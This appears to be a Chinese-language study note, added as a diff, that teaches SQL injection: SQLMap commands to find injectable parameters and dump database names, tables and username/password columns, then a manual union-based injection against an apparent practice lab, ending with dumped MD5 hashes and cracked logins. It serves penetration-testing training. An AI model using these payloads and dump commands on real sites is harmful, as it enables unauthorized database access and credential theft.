@@ -1,0 +1,80 @@
+1、操作过程
+  1> 安装python  
+　　　　官网https://www.python.org/ ，SQLMap使用Python写的
+　　2> 安装SQLMap
+　　　　官网 http://sqlmap.org/ 选择最近版本安装即可
+　　3> 设置环境变量
+　　　　设置环境变量，在CMD中使用SQLMap了
+  4> SQLMap常用命令介绍
+	　　1) sqlmap.py -u "http://www.XXX.com/index.asp?id=1"     
+	　　　　判断id参数是否存在注入：结果中包含 “id” is Vulnerable  字段表示存在注入
+	　　　　存在注入，下面的步骤才可以执行成功~
+	　　2) sqlmap.py -u "http://www.XXX.com/index.asp?id=1"  --dbs
+	　　　　列举能列出的所有数据库名
+	　　3)  sqlmap.py -u "http://www.XXX.com/index.asp?id=1" --current-db
+	　　　　列出当前使用的数据库名，假设列出“sqltest”数据库　　
+	　　4)  sqlmap.py -u "http://www.XXX.com/index.asp?id=1"  --is-dba
+	　　　　判断该注入点是否有管理员权限：返回true  表示是管理员
+	　　5)  sqlmap.py -u "http://www.XXX.com/index.asp?id=1" -D "sqltest" --tables
+	　　　　获取sqltest中的所有表，假设有"admin"表
+	　　6)  sqlmap.py -u "http://www.XXX.com/index.asp?id=1" -D "sqltest" -T "admin" --columns
+	　　　　列举表admin的字段（列名），假设存在"username","password"字段
+	　　7)  sqlmap.py -u "http://www.XXX.com/index.asp?id=1" -D "sqltest" -T "admin" -C "username,password" --dump
+	　　　　下载字段username，password的值，若询问是否破解md5加密，选择no即可
+　　5> 想看工具的注入过程 使用-v参数
+　　　　-level 会提高注入等级（默认0 只会判断get，post参数是否有注入点）
+　　　　若注入点是POST方式，或是注入点才Cookie，User-Agent中，可以利用-Date 参数 -Cookie参数指定
+　　　　当然用buip Suite架个代理，截取数据包，直接 -r 参数引入数据包也可以完成上述的注入情况的~
+
+  6> 注入Demo
+　　　　本次演示使用Apache+Php +Mysql 环境，其他环境的话
+　　　　使用SQLMap输入还是相同的命令，这点SQLMap做的好方便
+
+2、简单盲注入手动
+	http://219.153.49.228:41517/new_list.php?id=1
+	http://219.153.49.228:48930/new_list.php?id=1 and 1=1
+	http://219.153.49.228:42143/
+	打开环境，点击访问 
+	1.寻找注入点，打开控制台（快捷键F12），在平台停机维护通知处发现注入点，开始尝试进行注入测试 
+		id=1 and 1=1 正常页面 
+		id=1 and 1=2 不正常页面 存在数字型注入 
+	2>判断数量 
+		http://219.153.49.228:48930/new_list.php?id=1 order by 5 非正常回显 
+		http://219.153.49.228:48930/new_list.php?id=1 order by 4 正常回显 
+		可判断为4个字段 
+	3>看回显  
+		http://219.153.49.228:41517/new_list.php?id=-1 union select 1,2,3,4 
+	4>爆出数据库名字		mozhe_Discuz_StormGroup
+		http://219.153.49.228:41517/new_list.php?id=-1 union select 1,database(),3,4
+	5>爆出表名 StormGroup_member、notice
+		http://219.153.49.228:41517/new_list.php?id=-1 union 
+			select 1,group_concat(table_name),3,4 
+				from information_schema.tables 
+				where table_schema = database()
+	6>爆破列 id,name,password,status
+		http://219.153.49.228:41517/new_list.php?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name = 'StormGroup_member'
+	7>根据列爆内容  mozhe、mozhe  		356f589a7df439f6f744ff19bb8092c0,815e679429c517189bc5ac312774dae9
+		http://219.153.49.228:41517/new_list.php?id=-1 union select 1,group_concat(name),group_concat(password),4 from StormGroup_member
+	8>爆出用户名及密码 发现密码是MD5加密的，密码通过MD5解密后，使用账号及密码进行登录
+		mozhe		mozhe 
+		dsan13		255144
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
